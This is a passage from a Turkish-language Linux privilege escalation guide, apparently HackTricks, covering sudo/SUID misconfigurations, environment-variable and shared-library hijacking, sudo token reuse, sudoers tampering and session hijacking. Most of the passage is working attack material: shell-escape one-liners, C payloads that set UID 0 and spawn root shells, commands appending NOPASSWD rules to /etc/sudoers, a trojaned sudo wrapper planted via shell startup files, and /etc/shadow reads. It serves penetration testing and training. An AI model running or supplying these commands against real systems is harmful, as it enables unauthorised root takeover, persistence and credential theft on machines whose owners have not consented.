`socat` bağlantısını kurduktan sonra, host dosya sistemine root düzeyinde erişimi olan container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Dikkat: Eğer docker socket üzerinde yazma izinleriniz varsa çünkü **`docker` grubunun içindeyseniz** [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker'dan çıkma veya onu kötüye kullanarak yetki yükseltme için daha fazla yolu kontrol edin:

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli bir şekilde etkileşimde bulunmasını ve veri paylaşmasını sağlayan gelişmiş bir inter-Process Communication (IPC) sistemidir. Modern Linux sistemi düşünülerek tasarlanmıştır ve çeşitli uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arasındaki veri alışverişini geliştiren temel IPC'yi destekler ve bu, **enhanced UNIX domain sockets**'i anımsatır. Ayrıca olay veya sinyal yayınlamaya yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'dan gelen gelen arama sinyali, bir müzik oynatıcıyı sessize almasını tetikleyebilir; bu kullanıcı deneyimini iyileştirir. Buna ek olarak, D-Bus uzak nesne sistemi desteği sağlar; bu da uygulamalar arasında servis taleplerini ve yöntem çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, **allow/deny model** üzerinde çalışır; eşleşen politika kurallarının kümülatif etkisine göre mesaj izinlerini (method calls, signal emissions, vb.) yönetir. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin kötüye kullanılması yoluyla privilege escalation'a izin verebilir.

Böyle bir politika örneği `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde verilmiştir; root kullanıcısının `fi.w1.wpa_supplicant1`'e ait olma, ona mesaj gönderme ve ondan mesaj alma izinlerini detaylandırır.

Belirli bir kullanıcı veya grup belirtilmeyen politikalar evrensel olarak uygulanır; "default" bağlam politikaları ise diğer özel politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Burada D-Bus communication'ı enumerate ve exploit etmeyi öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Network'i enumerate etmek ve makinenin konumunu tespit etmek her zaman ilginçtir.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce etkileşim kuramadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı kimlik bilgilerini ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Generic Enumeration

Kontrol edin **kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemde hangi **kullanıcılar** olduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root yetkilerine** sahip olduğunu:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesi yapmasına izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**İstismar etmek için kullanın:** **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları verebilecek **bir grubun üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Panoya

Eğer mümkünse panoda ilginç bir şey olup olmadığını kontrol edin.
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamın herhangi bir parolasını **biliyorsanız**, bu parolayı kullanarak **her kullanıcıya giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmayı umursamıyorsanız ve `su` ve `timeout` ikili dosyaları bilgisayarda mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıyı brute-force etmeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile aynı zamanda kullanıcıları brute-force etmeyi de dener.

## Yazılabilir PATH istismarları

### $PATH

Eğer $PATH içindeki herhangi bir klasöre **yazabiliyorsanız** ayrıcalıkları yükseltmek için yazılabilir klasörün içine farklı bir kullanıcı (idealde root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturabilir** ve bu komutun $PATH'te yazılabilir klasörünüzden **önce bulunan bir klasörden yüklenmiyor** olması gerekir.

### SUDO and SUID

Bazı komutları sudo ile çalıştırma izniniz olabilir veya dosyalar suid bitiyle işaretlenmiş olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosya okumanıza ve/veya yazmanıza ya da hatta bir komut çalıştırmanıza izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla şifre bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo`, `vim`'i `root` olarak çalıştırabiliyor; `root` dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell elde etmek artık çok kolay.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şey çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesinin yüklenmesine izin veren **PYTHONPATH hijacking**'e **vulnerable** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV sudo env_keep ile korunduğunda → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çalıştırırken Bash'in etkileşimli olmayan başlangıç davranışından yararlanarak root olarak istediğiniz kodu çalıştırabilirsiniz.

- Neden işe yarıyor: Etkileşimli olmayan shell'lerde Bash, `$BASH_ENV`'i değerlendirir ve hedef script'i çalıştırmadan önce o dosyayı kaynak olarak yükler. Birçok sudo kuralı bir script veya bir shell wrapper çalıştırmaya izin verir. Eğer sudo `BASH_ENV`'i koruyorsa, dosyanız root ayrıcalıklarıyla kaynaklanır.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimli olmayan şekilde `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde bulunması (kontrol etmek için `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- env_keep'ten `BASH_ENV` (ve `ENV`) kaldırın, `env_reset`'i tercih edin.
- sudo ile izin verilen komutlar için shell wrapper'larından kaçının; minimal binaries kullanın.
- Korunan env vars kullanıldığında sudo için I/O logging ve alerting uygulanmasını değerlendirin.

### Sudo yürütme atlatma yolları

**Atlayın** diğer dosyaları okumak için veya **symlinks** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), iş daha da kolaylaşır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary komut yolu belirtilmeden

Eğer **sudo izni** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bundan yararlanabilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** ikili dosyası **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman garip bir SUID ikili dosyasının içeriğini _**strings**_ ile kontrol edin)** de kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** ikili dosyası **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı adda bir **export a function** oluşturarak bunu deneyebilirsiniz.

Örneğin, eğer bir suid ikili dosyası _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ardından, suid binary çağrıldığında bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) ile etkin kullanıcı kimliği (_euid_) eşleşmiyorsa **LD_PRELOAD**'u göz ardı eder.
- suid/sgid olan yürütülebilir dosyalar için, yalnızca standart yollar içinde ve ayrıca suid/sgid olan kütüphaneler önceden yüklenir.

Yetki yükseltmesi, `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa meydana gelebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin `sudo` ile komutlar çalıştırıldığında bile korunmasına ve tanınmasına izin verir; bu da yükseltilmiş ayrıcalıklarla rastgele kod yürütülmesine yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu adla kaydedin: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **derleyin** kullanarak:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** komutunu çalıştırın
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa suistimal edilebilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Sıradışı görünen **SUID** izinlerine sahip bir binary ile karşılaşıldığında, bunun **.so** dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak exploitation için potansiyel olduğunu gösterir.

Bunu exploit etmek için, aşağıdaki kodu içeren bir C dosyası oluşturulur; örneğin _"/path/to/.config/libcalc.c"_:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu şekilde derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'sinin çalıştırılması exploit'i tetiklemeli ve potansiyel olarak sistemin ele geçirilmesine izin vermelidir.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabileceğimiz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyona sahip olması gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikili dosyalarının, bir saldırgan tarafından yerel güvenlik kısıtlamalarını aşmak için istismar edilebileceği düzenlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) aynı şeydir ancak bir komuta **sadece argüman enjekte edebiliyorsanız** olan durumlar içindir.

Proje, kötüye kullanılabilecek Unix ikili dosyalarının meşru fonksiyonlarını toplar; bunlar restricted shells'tan kaçmak, ayrıcalıkları yükseltmek veya korumak, dosya transferi yapmak, bind and reverse shells oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için istismar edilebilir.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl istismar edeceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolasını bilmediğiniz halde **sudo erişiminiz** olduğu durumlarda, **sudo komut yürütmesini bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten bir shell'e "_sampleuser_" kullanıcısı olarak sahipsiniz
- "_sampleuser_" **son 15 dakika içinde** `sudo` kullanarak bir şey yürütmüş (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` değeri 0 olmalıdır
- `gdb` erişilebilir olmalı (gerekirse yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını değiştirip `kernel.yama.ptrace_scope = 0` ayarlayabilirsiniz.)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **ikinci exploit** (`exploit_v2.sh`) _/tmp_ dizininde bir sh shell oluşturacak, bu shell **root'a ait ve setuid bitine sahip**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Üçüncü exploit** (`exploit_v3.sh`) **sudoers file oluşturacak**; bu **sudo tokens'ı kalıcı yapar ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Eğer klasörde veya klasör içindeki oluşturulmuş dosyalardan herhangi birinde **write permissions** varsa, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) kullanarak **create a sudo token for a user and PID** oluşturabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını overwrite edebiliyor ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek kalmadan **obtain sudo privileges** elde edebilirsiniz, şu şekilde:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimlerin `sudo` kullanabileceğini ve nasıl kullanabileceklerini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı ilginç bilgiler **elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** yetkileri **yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazma izniniz varsa bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikili dosyasına bazı alternatifler vardır; OpenBSD için `doas` gibi. Yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlanıp `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, root olarak önce kendi kodunuzu sonra kullanıcının komutunu çalıştıracak **yeni bir sudo executable** oluşturabilirsiniz. Ardından, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu .bash_profile içine ekleyerek) değiştirin, böylece kullanıcı sudo çalıştırdığında sizin sudo executable'ınız çalıştırılır.

Dikkat edin, eğer kullanıcı farklı bir shell (bash olmayan) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerekir. Örneğin[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`'i değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf` **yüklenecek yapılandırma dosyalarının kaynaklarını belirtir**. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları **diğer klasörlere işaret eder**; **kütüphaneler** bu klasörlerde **aranacaktır**. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib`'tir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Eğer herhangi bir nedenle **bir kullanıcı yazma izinlerine sahipse** belirtilen yollardan herhangi biri üzerinde: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasının işaret ettiği herhangi bir klasör, ayrıcalıkları yükseltebilir.\
Bu yanlış yapılandırmanın **nasıl exploit edileceğini** aşağıdaki sayfada inceleyin:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu konumda kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içinde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` ile kötü amaçlı bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir sürece mevcut root ayrıcalıklarının bir alt kümesini sağlar. Bu, root ayrıcalıklarını daha küçük ve ayırt edici birimlere bölerek etkili olur. Bu birimlerin her biri daha sonra süreçlere bağımsız olarak verilebilir. Bu şekilde tüm ayrıcalık kümesi azaltılır ve exploitation riskleri düşürülür.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunların nasıl kötüye kullanılacağı** hakkında daha fazla bilgi edinin:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, "**execute**" biti etkilenen kullanıcının klasöre "**cd**" yapabileceğini ifade eder.\
"**read**" biti kullanıcının **dosyaları listeleyebileceğini**, ve "**write**" biti kullanıcının **dosyaları silebileceğini ve yeni dosyalar oluşturabileceğini** ifade eder.

## ACLs

Access Control Lists (ACLs), geleneksel ugo/rwx izinlerini **geçersiz kılabilen** isteğe bağlı izinlerin ikincil katmanını temsil eder. Bu izinler, dosya veya dizine erişimi, sahibi veya grup üyesi olmayan belirli kullanıcılara izin verip/veya reddederek kontrol etmeyi sağlar. Bu seviye **daha hassas erişim yönetimi** sağlar. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) adresine bakın.

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Alın** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık **shell** oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**En yeni sürümlerde** sadece **kendi kullanıcı hesabınıza** ait screen sessions'lara **connect** olabilirsiniz. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen sessions** listesini göster
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir session'a bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Root tarafından oluşturulmuş bir tmux (v2.1) oturumunu ayrıcalıksız bir kullanıcı olarak ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Session'a bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** için bir örneğe bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.  
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication'ın izinli olup olmadığını belirtir. Varsayılan `no`.
- **PubkeyAuthentication:** public key authentication'ın izinli olup olmadığını belirtir. Varsayılan `yes`.
- **PermitEmptyPasswords**: Password authentication izinliyse, sunucunun boş password string'ine sahip hesaplara login'e izin verip vermediğini belirtir. Varsayılan `no`.

### PermitRootLogin

root'un ssh ile login olmasına izin verilip verilmediğini belirtir, varsayılan `no`. Olası değerler:

- `yes`: root password ve private key kullanarak login olabilir
- `without-password` or `prohibit-password`: root sadece private key ile login olabilir
- `forced-commands-only`: Root sadece private key ile ve komut (commands) seçenekleri belirtilmişse login olabilir
- `no` : izin verilmez

### AuthorizedKeysFile

Kullanıcı authentication için kullanılabilecek public keys'i içeren dosyaları belirtir. `%h` gibi token'lar içerebilir; bu token kullanıcının home directory'si ile değiştirilir. **Mutlak yollar** (`/` ile başlayan) veya **kullanıcının home'undan göreli yollar** belirtilebilir. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**"ın **private** anahtarı ile giriş yapmaya çalışırsanız, ssh anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını belirtir.

### ForwardAgent/AllowAgentForwarding

